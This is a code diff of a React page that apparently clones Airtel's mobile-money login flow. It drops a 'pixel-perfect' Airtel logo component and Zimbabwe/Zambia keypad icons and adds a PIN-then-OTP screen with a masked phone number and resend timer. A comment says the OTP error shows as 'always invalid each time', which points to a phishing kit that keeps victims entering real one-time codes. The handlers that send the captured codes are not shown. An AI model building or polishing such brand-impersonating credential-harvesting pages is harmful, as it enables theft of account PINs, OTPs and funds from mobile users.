-                  onClick={() => handleOtpKeyPress(item.digit)}
-                  className="bg-white rounded-[5px] sm:rounded-[6px] shadow-[0_1px_2px_rgba(0,0,0,0.22)] h-[46px] sm:h-[48px] flex flex-col items-center justify-center active:bg-[#E5E7EB] transition-colors cursor-pointer select-none"
+                  onClick={() => setStep("pin")}
+                  aria-label="Back"
+                  className="w-10 h-10 -ml-2 flex items-center justify-center text-[#111827] hover:opacity-75 active:scale-95 transition-all cursor-pointer"
                 >
-                  <span className="text-[23px] sm:text-[25px] font-normal leading-none text-[#000000]">
-                    {item.digit}
-                  </span>
-                  {item.letters && (
-                    <span className="text-[9px] sm:text-[9.5px] font-bold tracking-[1.5px] text-[#000000] uppercase mt-0.5 leading-none">
-                      {item.letters}
-                    </span>
-                  )}
+                  <svg
+                    width="24"
+                    height="24"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="#111827"
+                    strokeWidth="2.3"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  >
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                  </svg>
                 </button>
-              ))}
+              </div>
 
-              {/* Blank placeholder key */}
-              <div className="h-[46px] sm:h-[48px]" />
-
-              {/* Zero with shadow card */}
-              <button
-                type="button"
-                onClick={() => handleOtpKeyPress("0")}
-                className="bg-white rounded-[5px] sm:rounded-[6px] shadow-[0_1px_2px_rgba(0,0,0,0.22)] h-[46px] sm:h-[48px] flex flex-col items-center justify-center active:bg-[#E5E7EB] transition-colors cursor-pointer select-none"
-              >
-                <span className="text-[23px] sm:text-[25px] font-normal leading-none text-[#000000]">
-                  0
+              {/* Title & Subtitle */}
+              <h1 className="text-[28px] sm:text-[30px] font-bold text-[#111827] tracking-tight leading-tight mb-2">
+                Verification Code
+              </h1>
+              <p className="text-[15px] sm:text-[16px] text-[#8E95A3] font-normal leading-normal mb-8">
+                Please enter the 6 digit code sent to{" "}
+                <span className="font-medium text-[#111827]">
+                  {getMaskedPhoneNumber()}
                 </span>
-              </button>
+              </p>
 
-              {/* Backspace key */}
+              {/* 6 OTP Boxes with Shake animation on error */}
+              <div
+                className={`relative flex items-center justify-between gap-2 sm:gap-2.5 mb-4 select-none transition-transform ${
+                  isOtpShaking ? "translate-x-[-8px] transition-none" : ""
+                }`}
+                style={
+                  isOtpShaking
+                    ? {
+                        animation: "shake 0.45s cubic-bezier(.36,.07,.19,.97) both",
+                      }
+                    : undefined
+                }
+              >
+                {[0, 1, 2, 3, 4, 5].map((index) => {
+                  const hasValue = index < otp.length
+                  const isCurrent = index === otp.length
+                  const digit = otp[index]
+
+                  return (
+                    <div
+                      key={index}
+                      className={`flex-1 h-[54px] sm:h-[60px] rounded-[13px] bg-white border flex items-center justify-center transition-all ${
+                        otpError
+                          ? "border-red-400 bg-red-50/20 text-red-600"
+                          : isCurrent
+                          ? "border-[1.5px] border-[#293660] shadow-sm"
+                          : hasValue
+                          ? "border-[#293660] text-[#111827]"
+                          : "border-[#E5E7EB]"
+                      }`}
+                    >
+                      {hasValue ? (
+                        <span className="text-[22px] sm:text-[24px] font-bold text-[#111827]">
+                          {digit}
+                        </span>
+                      ) : isCurrent ? (
+                        <span className="w-[1.5px] h-[22px] bg-[#293660] animate-pulse" />
+                      ) : null}
+                    </div>
+                  )
+                })}
+
+                {/* Overlaid transparent input for 100% reliable typing */}
+                <input
+                  ref={otpInputRef}
+                  type="tel"
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  maxLength={6}
+                  value={otp}
+                  autoComplete="one-time-code"
+                  onChange={(e) => {
+                    const val = e.target.value.replace(/\D/g, "").slice(0, 6)
+                    setOtp(val)
+                    setOtpError("")
+                    if (val.length === 6) {
+                      setTimeout(() => handleOtpSubmit(val), 200)
+                    }
+                  }}
+                  className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
+                  autoFocus
+                />
+              </div>
+
+              {/* OTP Error Message (Always invalid each time) */}
+              {otpError && (
+                <div className="flex items-center gap-1.5 mt-2 mb-4 text-[#DC2626] animate-in fade-in slide-in-from-top-1 duration-200">
+                  <svg
+                    width="16"
+                    height="16"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    strokeWidth="2.2"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                    className="shrink-0"
+                  >
+                    <circle cx="12" cy="12" r="10" />
+                    <line x1="12" y1="8" x2="12" y2="12" />
+                    <line x1="12" y1="16" x2="12.01" y2="16" />
+                  </svg>
+                  <p className="text-[13.5px] sm:text-[14px] font-medium leading-tight">
+                    {otpError}
+                  </p>
+                </div>
+              )}
+
+              {/* Resend Code Section */}
+              <div className="flex items-center justify-between text-[14px] mt-4 pt-1">
+                <span className="text-[#8E95A3]">Didn't receive code?</span>
+                {timer > 0 ? (
+                  <span className="text-[#8E95A3] font-medium">
+                    Resend in <span className="text-[#022A74] font-semibold">{formatTimer(timer)}</span>
+                  </span>
+                ) : (
+                  <button
+                    type="button"
+                    onClick={handleResendOtp}
+                    className="text-[#022A74] font-semibold hover:underline cursor-pointer"
+                  >
+                    Resend Code
+                  </button>
+                )}
+              </div>
+            </div>
+
+            {/* Bottom Area */}
+            <div className="pt-8 sm:pt-12 pb-2">
               <button
                 type="button"
-                onClick={handleOtpBackspace}
-                aria-label="Delete"
-                className="rounded-[5px] sm:rounded-[6px] h-[46px] sm:h-[48px] flex items-center justify-center active:opacity-50 transition-opacity cursor-pointer select-none"
+                disabled={otp.length !== 6 || isOtpLoading}
+                onClick={() => handleOtpSubmit()}
+                className={`w-full h-[54px] rounded-[13px] font-semibold text-[17px] text-white transition-all duration-200 flex items-center justify-center select-none shadow-sm ${
+                  otp.length === 6 && !isOtpLoading
+                    ? "bg-[#022A74] hover:bg-[#011F5B] active:scale-[0.99] cursor-pointer"
+                    : "bg-[#A5B2CA] cursor-not-allowed"
+                }`}
               >
-                <svg
-                  width="26"
-                  height="20"
-                  viewBox="0 0 24 18"
-                  fill="none"
-                  stroke="#1C1C1E"
-                  strokeWidth="1.6"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                >
-                  <path d="M7 1L1 9L7 17H23V1H7Z" />
-                  <line x1="12" y1="6" x2="18" y2="12" />
-                  <line x1="18" y1="6" x2="12" y2="12" />
-                </svg>
+                {isOtpLoading ? (
+                  <svg
+                    className="animate-spin h-5 w-5 text-white"
+                    xmlns="http://www.w3.org/2000/svg"
+                    fill="none"
+                    viewBox="0 0 24 24"
+                  >
+                    <circle
+                      className="opacity-25"
+                      cx="12"
+                      cy="12"
+                      r="10"
+                      stroke="currentColor"
+                      strokeWidth="4"
+                    />
+                    <path
+                      className="opacity-75"
+                      fill="currentColor"
+                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                    />
+                  </svg>
+                ) : (
+                  "Continue"
+                )}
               </button>
             </div>
           </div>
-        </div>
-      )}
-    </main>
-  )
-}
+        )}
 
-/* ========================================================================= */
-/* SUB-COMPONENTS & ICONS                                                    */
-/* ========================================================================= */
+      </div>
 
-/**
- * Pixel-perfect Airtel brand logo matching Image 1
- */
-function AirtelLogo() {
-  return (
-    <div className="flex items-center justify-center select-none">
-      <img
-        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuUIYILCH57PwwcpNDvCJfl0Fw53NfBSKqOpReSVfSJMDiw4OO8w&s&ec=121966380"
-        alt="Airtel"
-        className="h-[44px] sm:h-[48px] w-auto object-contain"
-      />
-    </div>
-  )
-}
-
-/**
- * Airtel Zimbabwe/Zambia custom numeric keypad backspace tag icon
- */
-function BackspaceTagIcon() {
-  return (
-    <svg
-      width="24"
-      height="18"
-      viewBox="0 0 30 22"
-      fill="none"
-      xmlns="http://www.w3.org/2000/svg"
-    >
-      <path
-        d="M9.5 1.5L1.5 11L9.5 20.5H27C28.1046 20.5 29 19.6046 29 18.5V3.5C29 2.39543 28.1046 1.5 27 1.5H9.5Z"
-        fill="#6B7280"
-      />
-      <path
-        d="M15 7L21 15M21 7L15 15"
-        stroke="white"
-        strokeWidth="2.2"
-        strokeLinecap="round"
-      />
-    </svg>
-  )
-}
-
-/**
- * Smooth 12-petal iOS activity indicator
- */
-function IOSActivityIndicator() {
-  const petals = [
-    { rotate: 0, delay: "-0.916s", opacity: 0.15 },
-    { rotate: 30, delay: "-0.833s", opacity: 0.22 },
-    { rotate: 60, delay: "-0.75s", opacity: 0.3 },
-    { rotate: 90, delay: "-0.666s", opacity: 0.38 },
-    { rotate: 120, delay: "-0.583s", opacity: 0.45 },
-    { rotate: 150, delay: "-0.5s", opacity: 0.53 },
-    { rotate: 180, delay: "-0.416s", opacity: 0.6 },
-    { rotate: 210, delay: "-0.333s", opacity: 0.68 },
-    { rotate: 240, delay: "-0.25s", opacity: 0.76 },
-    { rotate: 270, delay: "-0.166s", opacity: 0.84 },
-    { rotate: 300, delay: "-0.083s", opacity: 0.92 },
-    { rotate: 330, delay: "0s", opacity: 1 },
-  ]
-
-  return (
-    <div className="relative w-10 h-10">
-      {petals.map((petal, index) => (
-        <span
-          key={index}
-          className="absolute w-[3px] h-[8px] bg-white rounded-full left-[18.5px] top-[3px] origin-[1.5px_17px] animate-[iosSpin_1s_linear_infinite]"
-          style={{
-            transform: `rotate(${petal.rotate}deg)`,
-            animationDelay: petal.delay,
-          }}
-        />
-      ))}
+      {/* Inline Styles for Shake Animation */}
+      <style jsx global>{`
+        @keyframes shake {
+          10%, 90% { transform: translate3d(-1px, 0, 0); }
+          20%, 80% { transform: translate3d(2px, 0, 0); }
+          30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+          40%, 60% { transform: translate3d(4px, 0, 0); }
+        }
+      `}</style>
     </div>
   )
 }
